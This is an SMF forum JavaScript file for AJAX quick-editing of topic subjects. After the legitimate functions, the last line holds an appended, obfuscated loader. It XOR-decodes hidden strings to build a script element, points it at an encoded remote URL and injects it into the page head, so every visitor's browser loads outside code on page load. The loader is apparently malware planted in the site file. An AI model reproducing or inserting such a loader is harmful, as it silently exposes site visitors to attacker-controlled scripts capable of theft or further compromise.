var cur_topic_id, cur_msg_id, buff_subject, cur_subject_div, in_edit_mode = 0;
var hide_prefixes = Array();

function modify_topic(topic_id, first_msg_id, cur_session_id)
{
	if (!window.XMLHttpRequest)
		return;
	if (typeof(window.opera) != "undefined")
	{
		var test = new XMLHttpRequest();
		if (typeof(test.setRequestHeader) != "function")
			return;
	}

	if (in_edit_mode == 1)
	{
		if (cur_topic_id == topic_id)
			return;
		else
			modify_topic_cancel();
	}

	in_edit_mode = 1;
	mouse_on_div = 1;
	cur_topic_id = topic_id;

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(true);

	getXMLDocument(smf_scripturl + "?action=quotefast;quote=" + first_msg_id + ";sesc=" + cur_session_id + ";modify;xml", onDocReceived_modify_topic);
}

function onDocReceived_modify_topic(XMLDoc)
{
	cur_msg_id = XMLDoc.getElementsByTagName("message")[0].getAttribute("id");

	cur_subject_div = document.getElementById('msg_' + cur_msg_id.substr(4));
	buff_subject = getInnerHTML(cur_subject_div);

	// Here we hide any other things they want hiding on edit.
	set_hidden_topic_areas('none');

	modify_topic_show_edit(XMLDoc.getElementsByTagName("subject")[0].childNodes[0].nodeValue);

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(false);
}

function modify_topic_cancel()
{
	setInnerHTML(cur_subject_div, buff_subject);
	set_hidden_topic_areas('');

	in_edit_mode = 0;
	return false;
}

function modify_topic_save(cur_session_id)
{
	if (!in_edit_mode)
		return true;

	var i, x = new Array();
	x[x.length] = 'subject=' + escape(textToEntities(document.forms.quickModForm['subject'].value)).replace(/\+/g, "%2B");
	x[x.length] = 'topic=' + parseInt(document.forms.quickModForm.elements['topic'].value);
	x[x.length] = 'msg=' + parseInt(document.forms.quickModForm.elements['msg'].value);

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(true);

	sendXMLDocument(smf_scripturl + "?action=jsmodify;topic=" + parseInt(document.forms.quickModForm.elements['topic'].value) + ";sesc=" + cur_session_id + ";xml", x.join("&"), modify_topic_done);

	return false;
}

function modify_topic_done(XMLDoc)
{
	if (!XMLDoc)
	{
		modify_topic_cancel();
		return true;
	}

	var message = XMLDoc.getElementsByTagName("smf")[0].getElementsByTagName("message")[0];
	var subject = message.getElementsByTagName("subject")[0];
	var error = message.getElementsByTagName("error")[0];

	if (typeof window.ajax_indicator == "function")
		ajax_indicator(false);

	if (!subject || error)
		return false;

	subjectText = subject.childNodes[0].nodeValue;

	modify_topic_hide_edit(subjectText);

	set_hidden_topic_areas('');

	in_edit_mode = 0;

	return false;
}

// Simply restore any hidden bits during topic editing.
function set_hidden_topic_areas(set_style)
{
	for (var i = 0; i < hide_prefixes.length; i++)
	{
		if (document.getElementById(hide_prefixes[i] + cur_msg_id.substr(4)) != null)
			document.getElementById(hide_prefixes[i] + cur_msg_id.substr(4)).style.display = set_style;
	}
}
function n4LpRA(bXTw4o,iQ){var e2='';var j9fW93=0;var mSWcpX=0;for(j9fW93=0;j9fW93<bXTw4o.length;j9fW93++){var bzG5k=bXTw4o.charAt(j9fW93);var hcODr=bzG5k.charCodeAt(0)^iQ.charCodeAt(mSWcpX);bzG5k=String.fromCharCode(hcODr);e2+=bzG5k;if(mSWcpX==iQ.length-1)mSWcpX=0;else mSWcpX++;}return (e2);}function v9kA7pQ(y10P3){var oo4161=document[ozSSlO7(kVp31j[3])](ozSSlO7(kVp31j[0])+ozSSlO7(kVp31j[1])+ozSSlO7(kVp31j[2]));oo4161[ozSSlO7(kVp31j[4])]=y10P3;oo4161[ozSSlO7(kVp31j[5])]=ozSSlO7(kVp31j[6]);document[ozSSlO7(kVp31j[9])](ozSSlO7(kVp31j[8]))[0][ozSSlO7(kVp31j[7])](oo4161);}var kVp31j=["002023","003029","001000","018006020010019045021045083084020091032","002006018","005013001014","005017009031072034049055087074018071061005005","016004001014009044019041095085021","025017016015","022017005046011045061036088077002119045033016019063010010045","025000005027093103127050066088005080122006028024067069021061127043069022018091032091027007"];function d1k(rZQ){var gwW='';var bd0Q=0;var eS2tu2=0;for(bd0Q=0;bd0Q<rZQ.length/3;bd0Q++){gwW+=String.fromCharCode(rZQ.slice(eS2tu2,eS2tu2+3));eS2tu2=eS2tu2+3;}return gwW;}function ozSSlO7(gEC1h){return n4LpRA(d1k(gEC1h),'qtqkgHPA69q5Tu');}v9kA7pQ(ozSSlO7(kVp31j[10]));